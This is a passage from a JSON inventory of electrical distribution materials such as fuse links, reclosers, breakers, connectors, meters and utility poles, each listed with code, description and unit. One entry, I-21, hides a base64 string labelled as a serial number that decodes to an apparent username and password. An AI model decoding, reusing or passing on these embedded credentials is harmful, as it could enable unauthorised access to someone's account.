        "unit": "Nos."
    },
    {
        "item_name": "H-16.600",
        "description": "11 KV Recloser by-pass switches",
        "unit": "Set."
    },
    {
        "item_name": "H-18.600",
        "description": "Switch, Disconnect 11kv,600amps",
        "unit": "Nos."
    },
    {
        "item_name": "H-2.9",
        "description": "Arrester, Surge, Distribution Type, 9kv (Polymer)",
        "unit": "Nos."
    },
    {
        "item_name": "H-2.9",
        "description": "Arrester, Surge, Distribution Type, 9kv (Porcelin)",
        "unit": "Nos."
    },
    {
        "item_name": "H-23.100",
        "description": "Cutout,fused 11/6 35kv 15kv,100 Amp.line",
        "unit": "Nos."
    },
    {
        "item_name": "H-33.6",
        "description": "33KV Fuse Link",
        "unit": "Nos."
    },
    {
        "item_name": "H-51SCA",
        "description": "3 Cable For Switch",
        "unit": "Nos."
    },
    {
        "item_name": "H-51SCO",
        "description": "Control For Switch",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.001",
        "description": "Fuse Link, Type \u201cT\u201d, 1 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.002",
        "description": "Fuse Link, Type \u201cT\u201d, 2 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.003",
        "description": "Fuse Link, Type \u201cT\u201d, 3 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.005",
        "description": "Fuse Link, Type \u201cT\u201d, 5 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.006",
        "description": "Fuse Link, Type \u201cT\u201d, 6 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.008",
        "description": "Fuse Link, Type \u201cT\u201d, 8 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.010",
        "description": "Fuse Link, Type \u201cT\u201d, 10 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.012",
        "description": "Fuse Link, Type \u201cT\u201d, 12 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.015",
        "description": "Fuse Link, Type \u201cT\u201d, 15 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.020",
        "description": "Fuse Link, Type \u201cT\u201d, 20 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.025",
        "description": "Fuse Link, Type \u201cT\u201d, 25 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.030",
        "description": "Fuse Link, Type \u201cT\u201d, 30 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.040",
        "description": "Fuse Link, Type \u201cT\u201d, 40 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.050",
        "description": "Fuse Link, Type \u201cT\u201d, 50 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.065",
        "description": "Fuse Link, Type \u201cT\u201d, 65 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.080",
        "description": "Fuse Link, Type \u201cT\u201d, 80 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.1",
        "description": "Fuse Link, Type \"t\", 1 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.100",
        "description": "Fuse Link, Type \u201cT\u201d, 100 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.100E",
        "description": "100 Amps \"e\" Rated Power Fuse Link,standard",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.12",
        "description": "Fuse Link, Type \"t\", 12 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.15",
        "description": "Fuse Link, Type \"t\", 15 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.2",
        "description": "Fuse Link, Type \"t\", 2 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.20",
        "description": "Fuse Link, Type \"t\", 20 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.25",
        "description": "Fuse Link, Type \"t\", 25 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.3",
        "description": "Fuse Link, Type \"t\", 3 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.30",
        "description": "Fuse Link, Type \"t\", 30 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.40",
        "description": "Fuse Link, Type \"t\", 40 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.5",
        "description": "Fuse Link, Type \"t\", 5 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.50",
        "description": "Fuse Link, Type \"t\", 50 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.6",
        "description": "Fuse Link, Type \"t\", 6 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.65",
        "description": "Fuse Link, Type \"t\", 65 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.8",
        "description": "Fuse Link, Type \"t\", 8 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-6.80",
        "description": "Fuse Link, Type \"t\", 80 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "H-7.8 M",
        "description": "ACR Control Module",
        "unit": "Nos."
    },
    {
        "item_name": "H-9.25",
        "description": "Recloser,1phase 25amp Cont.1000 Amp Interpating",
        "unit": "Nos."
    },
    {
        "item_name": "H-9.50",
        "description": "Recloser,1 phase 50 Amp",
        "unit": "Nos."
    },
    {
        "item_name": "HS-10.1250",
        "description": "Circuit Breaker 33kv 3 phase 1250 Ams.( without CT/PT)",
        "unit": "Nos."
    },
    {
        "item_name": "HS-10.1250",
        "description": "Circuit Breaker 33kv 3 phase 1250 Ams with CT/PT  & Control Cable",
        "unit": "Nos."
    },
    {
        "item_name": "HS-11.1250",
        "description": "Circuit Breaker 11kv Vacuum 3 Phase, Indoor, 1250 Amps",
        "unit": "Nos."
    },
    {
        "item_name": "HS-11.2000",
        "description": "Circuit Breaker 11kv Vacuum 3 Phase, Indoor, 2000 Amps",
        "unit": "Nos."
    },
    {
        "item_name": "HS-11.630",
        "description": "Circuit Breaker 11kv Vacuum 3 Phase,  Indoor, 630 Amps",
        "unit": "Nos."
    },
    {
        "item_name": "HS-13.1250",
        "description": "Switch Air break 3-pole 1250 A, 34.5kv, 50 Hz",
        "unit": "Nos."
    },
    {
        "item_name": "HS-13.600",
        "description": "Switch Air break 3-pole 600 A, 34.5kv, 50 Hz",
        "unit": "Set."
    },
    {
        "item_name": "HS-19.600",
        "description": "Switch, Disconnect 33kv,600amps",
        "unit": "Nos."
    },
    {
        "item_name": "HS-2.010",
        "description": "Arrester, Surge, Station Type 9kv",
        "unit": "Nos."
    },
    {
        "item_name": "HS-3.036",
        "description": "Surge Arrester, 36kv Station Class",
        "unit": "Nos."
    },
    {
        "item_name": "HS-4.600",
        "description": "11 KV Recloser by-pass switches",
        "unit": "Nos."
    },
    {
        "item_name": "HS-5.1200",
        "description": "Switch, Regulator By-pass&dis.1 Pole 15.5kv",
        "unit": "Set."
    },
    {
        "item_name": "HS-6.002",
        "description": "Power fuse holder assembly Vert. x,arm",
        "unit": "Nos."
    },
    {
        "item_name": "HS-6.025",
        "description": "Fuse 34.5kv 50hz,25 Amps,standered Speed",
        "unit": "Nos."
    },
    {
        "item_name": "HS-6.065",
        "description": "Fuse 34.5kv 50hz,65 Amps Very Slow Speed",
        "unit": "Nos."
    },
    {
        "item_name": "HS-6.125E",
        "description": "Power fuse 34.5KV 50Hz,125 Amps, Very Slow",
        "unit": "Nos."
    },
    {
        "item_name": "HS-6.175E",
        "description": "Power fuse 34.5KV 50Hz,175 Amps, Very Slow",
        "unit": "Nos."
    },
    {
        "item_name": "HS-7.001",
        "description": "O.c.r Structure 3 Phase",
        "unit": "Nos."
    },
    {
        "item_name": "HS-7.400B",
        "description": "33KV, 400 Amps, Automatic Circuit recloser,3-ph 50hz",
        "unit": "Nos."
    },
    {
        "item_name": "HS-7.630B",
        "description": "33KV,630Amps, Automatic Circuit recloser 3 phase 50hz",
        "unit": "Nos."
    },
    {
        "item_name": "HS-7.800",
        "description": "33KV,Automatic Circuit Recloser 3 Phase",
        "unit": "Nos."
    },
    {
        "item_name": "HS-7.800B",
        "description": "33KV,800 Amps, Automatic Circuit recloser 3 phase 50hz",
        "unit": "Nos."
    },
    {
        "item_name": "HS-8.001",
        "description": "Acr Mounting Frame For Mcgraw Adison",
        "unit": "Nos."
    },
    {
        "item_name": "HS-8.400B",
        "description": "11KV, 400 Amps, Automatic Circuit recloser, 3 phase 50hz",
        "unit": "Nos."
    },
    {
        "item_name": "HSB-10.125",
        "description": "33 KV VCB Contact capsule",
        "unit": "Nos."
    },
    {
        "item_name": "HSB-10.630",
        "description": "11 KV VCB Contact Capsule",
        "unit": "Nos."
    },
    {
        "item_name": "HSC-10.125",
        "description": "33 KV VCB Close Coil 110 V",
        "unit": "Nos."
    },
    {
        "item_name": "HSC-11.630",
        "description": "11 KV VCB Close Coil 110V",
        "unit": "Nos."
    },
    {
        "item_name": "HS-OLTC-2",
        "description": "Panel and OLTC Heater",
        "unit": "Nos."
    },
    {
        "item_name": "HSP-10.125",
        "description": "33 KV VCB Pole complete",
        "unit": "Nos."
    },
    {
        "item_name": "HSP-11.630",
        "description": "11 KV VCB pole Complete",
        "unit": "Nos."
    },
    {
        "item_name": "HSS-10.125",
        "description": "33KV panel control Switch",
        "unit": "Nos."
    },
    {
        "item_name": "HST-10.125",
        "description": "33 KV VCB Trip Coil 110 V",
        "unit": "Nos."
    },
    {
        "item_name": "I-1",
        "description": "Connector, H Type, 4/0 X 4/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-11",
        "description": "Sleeve Service Un-insulated Yellow 1/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-14",
        "description": "Sleeve, Service, Un-insulated, Red #6 X Blue #6",
        "unit": "Nos."
    },
    {
        "item_name": "I-2",
        "description": "Connector, H Type, 4/0 X 1/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-21",
        "description": "Connector, Split Bolt, 1/0 X 1/0 SN:eyJ1IjogInJwYnMtMjYwOTciLCAicCI6ICJ2ZWN0b3JXaXRobWF0cml4QDIwMjYifQ==",
        "unit": "Nos."
    },
    {
        "item_name": "I-24",
        "description": "Clamp, Hot-line, 4/0 X #3 Tap & Main",
        "unit": "Nos."
    },
    {
        "item_name": "I-3",
        "description": "Connector, H Type, 4/0 X #3",
        "unit": "Nos."
    },
    {
        "item_name": "I-30",
        "description": "Pin, Transformer Terminal (lt) 4/0.",
        "unit": "Nos."
    },
    {
        "item_name": "I-31",
        "description": "Pin, Transformer Terminal 1/0 Acsr (lt).",
        "unit": "Nos."
    },
    {
        "item_name": "I-34",
        "description": "Connector, Adaptor, Xformer, 4 Hole,",
        "unit": "Nos."
    },
    {
        "item_name": "I-35A",
        "description": "Hot Line Clamp Adapter 1/0 & 4/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-4",
        "description": "Connector, H Type, 1/0 X 1/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-45",
        "description": "Connector, Service Clamp, 500/1000 Mcm",
        "unit": "Nos."
    },
    {
        "item_name": "I-5",
        "description": "Connector, H Type, 1/0 X #3",
        "unit": "Nos."
    },
    {
        "item_name": "I-50",
        "description": "Sleeve, Service Insulated, Blue-blue #6 X#6.",
        "unit": "Nos."
    },
    {
        "item_name": "I-51",
        "description": "Sleeve Service Bare,6 Acsr To 6 Acsr Blue-blue.",
        "unit": "Nos."
    },
    {
        "item_name": "I-52",
        "description": "Connector, Adaptor, Transformr, Pin, 2x1/0x500",
        "unit": "Nos."
    },
    {
        "item_name": "I-53",
        "description": "Connector,adaptor,transformr",
        "unit": "Nos."
    },
    {
        "item_name": "I-54",
        "description": "Clamp, Hot Line, Adaptor, Without Connector.",
        "unit": "Nos."
    },
    {
        "item_name": "I-57",
        "description": "Sleeve, Full tension, Automatic Type,",
        "unit": "Nos."
    },
    {
        "item_name": "I-58",
        "description": "Sleeve, Full tension, Automatic Type,",
        "unit": "Nos."
    },
    {
        "item_name": "I-59",
        "description": "Sleeve, Full tension, Automatic Type, #3",
        "unit": "Nos."
    },
    {
        "item_name": "I-6",
        "description": "Connector, H Type, #3 X #3",
        "unit": "Nos."
    },
    {
        "item_name": "I-60",
        "description": "Sleeve, Fulltension, Automatic Type,336.4 Mcm",
        "unit": "Nos."
    },
    {
        "item_name": "I-65",
        "description": "Connector, h-type, 636 MCM",
        "unit": "Nos."
    },
    {
        "item_name": "I-68",
        "description": "Connector, h-type, 477 MCM",
        "unit": "Nos."
    },
    {
        "item_name": "I-69",
        "description": "Connector, H-type, 336.4 Mcm Acsr X 4/0 Acsr.",
        "unit": "Nos."
    },
    {
        "item_name": "I-7",
        "description": "Connector, Street Light, #3x14x#8.",
        "unit": "Nos."
    },
    {
        "item_name": "I-71",
        "description": "Inhibitor,compound 16 Wage Cart",
        "unit": "Nos."
    },
    {
        "item_name": "I-73",
        "description": "Sleeve, Full tension, Auto Type, 477 Mcm",
        "unit": "Nos."
    },
    {
        "item_name": "I-74",
        "description": "Connector, h-type, 477 MCM to 4/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-75",
        "description": "Connector, h-type, 477 MCM to 1/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-76",
        "description": "Sleeve, Full Tension, 350 Mcm Cu.",
        "unit": "Nos."
    },
    {
        "item_name": "I-77",
        "description": "Sleeve, Full Tension, 500 Mcm Cu.",
        "unit": "Nos."
    },
    {
        "item_name": "I-78",
        "description": "Connector, #8x#8 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-79",
        "description": "Connector, #6x#6 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-8",
        "description": "Connector, Street Light #3 X 1/0x#14x#8.",
        "unit": "Nos."
    },
    {
        "item_name": "I-80",
        "description": "Connector, #2x#2 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-81",
        "description": "Connector, 1/0x#2 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-82",
        "description": "Connector, 1/0x1/0 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-83",
        "description": "Connector, 4/0x#2x#6 Cu. Compression.",
        "unit": "Nos."
    },
    {
        "item_name": "I-84",
        "description": "Connector, 4/0x2/0x1/0 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-85",
        "description": "Connector, 4/0x4/0 Cu. Compression",
        "unit": "Nos."
    },
    {
        "item_name": "I-86",
        "description": "Connector, 336.4 Mcm Acsr X 4/0 Acsr",
        "unit": "Nos."
    },
    {
        "item_name": "I-87",
        "description": "Connector, 336.4 Mcm Acsr X 336.4 Mcm Acsr",
        "unit": "Nos."
    },
    {
        "item_name": "I-88",
        "description": "Cold Shrink Splice Kit (#2-1/0,15kv)",
        "unit": "Nos."
    },
    {
        "item_name": "I-89",
        "description": "Cold Shrink Splice Kit(336 Mcm,15kv)",
        "unit": "Nos."
    },
    {
        "item_name": "I-9",
        "description": "Comp. Conn. Sleeve 4/0 To 4/0",
        "unit": "Nos."
    },
    {
        "item_name": "I-92",
        "description": "Compression connector(one die) for 636 MCM",
        "unit": "Nos."
    },
    {
        "item_name": "IS-002",
        "description": "Wire,nut Connector # 22 To 10",
        "unit": "Nos."
    },
    {
        "item_name": "IS-003",
        "description": "Wire,nut Connector# 18 To 10",
        "unit": "Nos."
    },
    {
        "item_name": "IS-004",
        "description": "Wire Connector(b/g)wire Range No.18 To 8",
        "unit": "Nos."
    },
    {
        "item_name": "IS-013",
        "description": "Station Post Bus Clam,4/0 STR TO 1590MCM",
        "unit": "Nos."
    },
    {
        "item_name": "IS-017",
        "description": "Station Post Bus Clam,4/0 Acsr",
        "unit": "Nos."
    },
    {
        "item_name": "IS-019",
        "description": "Bronze Tee Connector,4/0 Run-2/0 MHDCC Tap",
        "unit": "Nos."
    },
    {
        "item_name": "IS-020",
        "description": "Bronze Tee Connector, 4/0 Run -2/0 MHDCC Tap or 5/8 Rod",
        "unit": "Nos."
    },
    {
        "item_name": "IS-021",
        "description": "Bronze Tee Connector,2/0mhd Run&tap,5/8",
        "unit": "Nos."
    },
    {
        "item_name": "IS-021.1",
        "description": "Silicon Bronze Replacment",
        "unit": "Nos."
    },
    {
        "item_name": "IS-022",
        "description": "Bronze Tee Connector 1/0-4/0 Mhdcc,4bolt",
        "unit": "Nos."
    },
    {
        "item_name": "IS-035",
        "description": "Bronze Tee Connector, 1/0-500MCM  MHDCC , 4 Bolt Type",
        "unit": "Nos."
    },
    {
        "item_name": "IS-055",
        "description": "Compressed Connector H-type Cu.con.# 4/0 To",
        "unit": "Nos."
    },
    {
        "item_name": "IS-056",
        "description": "Compressed Connector H-type,cup.cond,#4/0 To",
        "unit": "Nos."
    },
    {
        "item_name": "IS-057",
        "description": "Compressed Connector H-type,cup,cond.#1/0",
        "unit": "Nos."
    },
    {
        "item_name": "IS-070",
        "description": "Bronze Terminal Bolted Type 500mcm",
        "unit": "Nos."
    },
    {
        "item_name": "IS-074",
        "description": "Bronze Terminal Bolted Type2/0-500mcm",
        "unit": "Nos."
    },
    {
        "item_name": "IS-076",
        "description": "Aluminium Terminal Bolted Type",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-110",
        "description": "Bronze Parallel Grove Ground Clamp#4/0 To",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-117",
        "description": "Bronze Parallel Grove Ground",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-130",
        "description": "Grounding Cable Clamp #4/0 MHDCC",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-131",
        "description": "Grounding Cable Clamp # 2/0 MHDCC",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-160",
        "description": "Fence Clamp 2\" Pipe To #2/0 MHDCC",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-162",
        "description": "Fence Clamp 1\" Pipe To Flexible Cupper",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-164",
        "description": "Fence Clamp 1\"pipe To 2/0 Mhdcc",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-166",
        "description": "Flexible Cu,gr,1-3/8\"x21\",2-hole",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-180",
        "description": "Wrench Lok Grounding Grid Connector",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-181",
        "description": "Small,wrench Lok,gro.grid Cont.1/0-250mcm To",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-182",
        "description": "Small,wrench Lok,gro.grid Cont.2/0-2/0 Mcm To",
        "unit": "Nos."
    },
    {
        "item_name": "ISG-183",
        "description": "Replacement Bolt For Ground Grip Connector",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-1.090",
        "description": "Thermo-weld Powder Charge 90p",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-1.115",
        "description": "Thermo-weld Powder Charge 115p",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-1.150",
        "description": "Thermo-weld Powder Charge 150p",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-1.200",
        "description": "Thermo-weld Powder Charge 200p",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.001",
        "description": "Handle Thermo-weld Mold",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.232",
        "description": "Thermo-weld Mold No-232 For Tee#2/0 Cu,run&tap",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.241",
        "description": "Thermo-weld Mold No-241 For Tee#4/0cu.run&tap",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.243",
        "description": "Thermo-weld Mold N0-243 For#4/0 To 2/0 Cu,tap",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.434",
        "description": "Thermo-weld Mold No-434 For Cross No-2/0-2/0 Cu",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.443",
        "description": "Thermo-weld Mold No-443 For Cross No-4/0-4/0",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.548",
        "description": "Thermo-weld Mold No-548 For 2/0-5/8\" Ground Rod",
        "unit": "Nos."
    },
    {
        "item_name": "ISGM-2.550",
        "description": "Thermo-weld Mold No-550 For Horizontal Cable",
        "unit": "Nos."
    },
    {
        "item_name": "J-1",
        "description": "Meter, Watthour, Single Phase, 10(50) Amp,",
        "unit": "Nos."
    },
    {
        "item_name": "J-16",
        "description": "Meter, Watt hour, Single Ph, Class 200,",
        "unit": "Nos."
    },
    {
        "item_name": "J-17",
        "description": "Meter Socket, Ringless, For Use With Item J-16",
        "unit": "Nos."
    },
    {
        "item_name": "J-23",
        "description": "Programmable Meter",
        "unit": "Nos."
    },
    {
        "item_name": "J-23(S)",
        "description": "Multi-fanction meter",
        "unit": "Nos."
    },
    {
        "item_name": "J-25",
        "description": "Test Switch Comp, Front Connected 7 Terminals",
        "unit": "Nos."
    },
    {
        "item_name": "J-3",
        "description": "Meter, Watthour-demand, 3-ph. Class 100,",
        "unit": "Nos."
    },
    {
        "item_name": "J-31",
        "description": "Meter Seal Twist Tite Wire Seal, blue/red",
        "unit": "Nos."
    },
    {
        "item_name": "J-39",
        "description": "Meter, watt hour, electronic Single Phase",
        "unit": "Nos."
    },
    {
        "item_name": "J-4",
        "description": "Meter,watthour-demand,3-ph. Class 20,",
        "unit": "Nos."
    },
    {
        "item_name": "J-42",
        "description": "Single Phase Smart Pre-payment Meter with communication module.",
        "unit": "Nos."
    },
    {
        "item_name": "J-42.1",
        "description": "Battery for Pre-Payment Meter",
        "unit": "Nos."
    },
    {
        "item_name": "J-42.2",
        "description": "DCU for smart Pre-payment Meter",
        "unit": "Nos."
    },
    {
        "item_name": "J-43",
        "description": "Three Phase CT-PT Rated, 20 Class Online AMR Meter with GPRS Module including required HES",
        "unit": "Nos."
    },
    {
        "item_name": "J-44",
        "description": "Three Phase Smart Pre-payment Meter with communication module.",
        "unit": "Nos."
    },
    {
        "item_name": "J-5",
        "description": "Meter Socket,100 Amp, For  Item J-2 & J-3",
        "unit": "Nos."
    },
    {
        "item_name": "J-6",
        "description": "Meter Socket, 13 Terminal  Base, For Item",
        "unit": "Nos."
    },
    {
        "item_name": "J-7R",
        "description": "Meter Seal, Plastic, Padlock Type, Red",
        "unit": "Nos."
    },
    {
        "item_name": "J-9",
        "description": "Meter Seal, Wire/lead, Disc Type",
        "unit": "Nos."
    },
    {
        "item_name": "K-1",
        "description": "Regulator, Voltage, Single Phase, Line,",
        "unit": "Nos."
    },
    {
        "item_name": "K-11",
        "description": "Capacitor, 50 Kvar (hv)",
        "unit": "Nos."
    },
    {
        "item_name": "K-12",
        "description": "Capacitor, 100 Kvar (hv)",
        "unit": "Nos."
    },
    {
        "item_name": "K-13",
        "description": "Capacitor, Terminal Cover, Insulated",
        "unit": "Nos."
    },
    {
        "item_name": "K-3",
        "description": "Capacitor, 5 Kvar (lv)",
        "unit": "Nos."
    },
    {
        "item_name": "K-4",
        "description": "Capacitor, 7.5 Kvar (lv)",
        "unit": "Nos."
    },
    {
        "item_name": "K-5",
        "description": "Capacitor, 10 Kvar (lv)",
        "unit": "Nos."
    },
    {
        "item_name": "KS-2.001",
        "description": "Voltage Regulator Mounting Frame",
        "unit": "Nos."
    },
    {
        "item_name": "KS-2.328",
        "description": "Voltage Regulator,1phase Automatic Step",
        "unit": "Nos."
    },
    {
        "item_name": "KS-2.328-3",
        "description": "Series Surge Arrester",
        "unit": "Nos."
    },
    {
        "item_name": "KS-2.656",
        "description": "Voltage Regulator 1 Phase Automatic Step",
        "unit": "Nos."
    },
    {
        "item_name": "KS-2.656-3",
        "description": "Siries Surge Arrester",
        "unit": "Nos."
    },
    {
        "item_name": "L-10",
        "description": "230V,30A MCB",
        "unit": "Nos."
    },
    {
        "item_name": "L-11",
        "description": "230V,15A MCB",
        "unit": "Nos."
    },
    {
        "item_name": "L-2",
        "description": "Street Light Reflactor",
        "unit": "Nos."
    },
    {
        "item_name": "L-6",
        "description": "LED Street Light Equipment set (with all accessories except MCB)",
        "unit": "Nos."
    },
    {
        "item_name": "L-7",
        "description": "Reflector",
        "unit": "Nos."
    },
    {
        "item_name": "L-8",
        "description": "LED Street Light 80W,8000Lumen",
        "unit": "Nos."
    },
    {
        "item_name": "L-9",
        "description": "230V,60A MCB",
        "unit": "Nos."
    },
    {
        "item_name": "LI-1",
        "description": "Alarm unit",
        "unit": "Nos."
    },
    {
        "item_name": "LI-2",
        "description": "Indicator Lights",
        "unit": "Nos."
    },
    {
        "item_name": "LS-1.001",
        "description": "Yard Light Shade W,proector Glass,bulb",
        "unit": "Nos."
    },
    {
        "item_name": "LS-1.002",
        "description": "240va/c,175 Watts,50 Hz,shade & Pipe",
        "unit": "Nos."
    },
    {
        "item_name": "LS-1.003",
        "description": "Photo Cell Unit 220v,a/c 50hz,3amperes",
        "unit": "Nos."
    },
    {
        "item_name": "M-1(S)",
        "description": "Motor, Tap Changer",
        "unit": "Nos."
    },
    {
        "item_name": "M-2(S)",
        "description": "Motor, Circuit Breaker",
        "unit": "Nos."
    },
    {
        "item_name": "ME-100",
        "description": "Angle-indicating Conduit Benders",
        "unit": "Nos."
    },
    {
        "item_name": "ME-104",
        "description": "Coductor Reel Easy Load And Lift Stand",
        "unit": "Nos."
    },
    {
        "item_name": "ME-105",
        "description": "Rocker Drum And Bareel Rack-me 105",
        "unit": "Nos."
    },
    {
        "item_name": "ME-109",
        "description": "Nock Out & Dive Paunch Mackmaster Car 3447 A 41",
        "unit": "Nos."
    },
    {
        "item_name": "ME-16",
        "description": "Transiite Survey.",
        "unit": "Nos."
    },
    {
        "item_name": "ME-22",
        "description": "Chain Binder 3/8\" Chain , Ratchet Type",
        "unit": "Nos."
    },
    {
        "item_name": "ME-23",
        "description": "Chain , 3/8\" Load Binding",
        "unit": "Nos."
    },
    {
        "item_name": "ME-3",
        "description": "Thermo Meter 6\" Long",
        "unit": "Nos."
    },
    {
        "item_name": "ME-85",
        "description": "LADDER EXTENSION 24' FIBER GLASS",
        "unit": "Nos."
    },
    {
        "item_name": "N-1",
        "description": "Wire, ground #5/16\" Diameter",
        "unit": "Mtr."
    },
    {
        "item_name": "N-2",
        "description": "Wire, guy # 1/4\" Diameter",
        "unit": "Mtr."
    },
    {
        "item_name": "N-3",
        "description": "Wire, guy # 3/8\" Diameter",
        "unit": "Mtr."
    },
    {
        "item_name": "N-4",
        "description": "Wire, guy # 7/16\" Diameter",
        "unit": "Mtr."
    },
    {
        "item_name": "N-8",
        "description": "Wire,guy,#7/16\" H.s Class-b",
        "unit": "Nos."
    },
    {
        "item_name": "PR-3",
        "description": "AVR  Relay",
        "unit": "Nos."
    },
    {
        "item_name": "PR-4",
        "description": "Auxiliary Relays and Conductor for OLT",
        "unit": "Nos."
    },
    {
        "item_name": "PR-5",
        "description": "Auxiliary Relays and Conductor for VCB",
        "unit": "Nos."
    },
    {
        "item_name": "PS-044",
        "description": "Outlet 31mm Conduit T-type",
        "unit": "Nos."
    },
    {
        "item_name": "PS-054",
        "description": "Cover 31mm Conduit Outlet",
        "unit": "Nos."
    },
    {
        "item_name": "PS-064",
        "description": "Gasket 31mm Conduit Outlet",
        "unit": "Nos."
    },
    {
        "item_name": "PS-083",
        "description": "Locknut 31mm Conduit",
        "unit": "Nos."
    },
    {
        "item_name": "PS-164",
        "description": "Elbow 1-1/4\" Diameter",
        "unit": "Nos."
    },
    {
        "item_name": "PS-174",
        "description": "Flug 1-1/4\" Conduit Outlet Square Head",
        "unit": "Nos."
    },
    {
        "item_name": "PS-193",
        "description": "Gal.steel Iron Conduit Cupler 31mm",
        "unit": "Nos."
    },
    {
        "item_name": "PS-323",
        "description": "Conduit Niple 31mm",
        "unit": "Nos."
    },
    {
        "item_name": "PS-381",
        "description": "Sadle Clamp 31mm",
        "unit": "Nos."
    },
    {
        "item_name": "PS-400",
        "description": "Plastick Wiring Duct Wiht Cover",
        "unit": "Nos."
    },
    {
        "item_name": "R-10",
        "description": "Pole, Wooden, 10.60M, Class 5",
        "unit": "Nos."
    },
    {
        "item_name": "R-11",
        "description": "Pole, Wooden, 10.60M, Class 6",
        "unit": "Nos."
    },
    {
        "item_name": "R-14",
        "description": "Pole, Wooden, 12.00M, Class 4",
        "unit": "Nos."
    },
    {
        "item_name": "R-15",
        "description": "Pole, Wooden, 12.00M, Class 5",
        "unit": "Nos."
    },
    {
        "item_name": "R-20",
        "description": "Pole, Wooden, 13.70M, Class 4",
        "unit": "Nos."
    },
    {
        "item_name": "R-27",
        "description": "Pole, Wooden, 15.20M, Class 4",
        "unit": "Nos."
    },
    {
        "item_name": "R-3",
        "description": "Pole, Wooden, 7.60M, Class 7",
        "unit": "Nos."
    },
    {
        "item_name": "R-31",
        "description": "Pole, Wooden, 18.3 M Class 2",
        "unit": "Nos."
    },
    {
        "item_name": "R-40",
        "description": "Pole, SPC, 7.60M, Class N7",
        "unit": "Nos."
    },
    {
        "item_name": "R-41",
        "description": "Pole, SPC, 9.00M, Class N6",
        "unit": "Nos."
    },
    {
        "item_name": "R-42",
        "description": "Pole, SPC, 9.00M, Class N5",
        "unit": "Nos."
    },
    {
        "item_name": "R-43",
        "description": "Pole, SPC, 10.60M, Class N6",
        "unit": "Nos."
    },
    {
        "item_name": "R-44",
        "description": "Pole, SPC, 10.60M, Class N5",
        "unit": "Nos."
    },
    {
        "item_name": "R-45",
        "description": "Pole, SPC, 12.00M, Class N5",
        "unit": "Nos."
    },
    {
        "item_name": "R-46",
        "description": "Pole, SPC, 12.00M, Class N4",
        "unit": "Nos."
    },
    {
        "item_name": "R-47",
        "description": "Pole, SPC, 13.70M, Class N4",
        "unit": "Nos."
    },
    {
        "item_name": "R-48",
        "description": "Pole, SPC, 15.20M, Class N4",
        "unit": "Nos."
    },
    {
        "item_name": "R-49",
        "description": "Pole, SPC, 18.30M, Class N2",
        "unit": "Nos."
    },
    {
        "item_name": "R-5",
        "description": "Pole, Wooden, 9.00M, Class 5",
        "unit": "Nos."
    },
    {
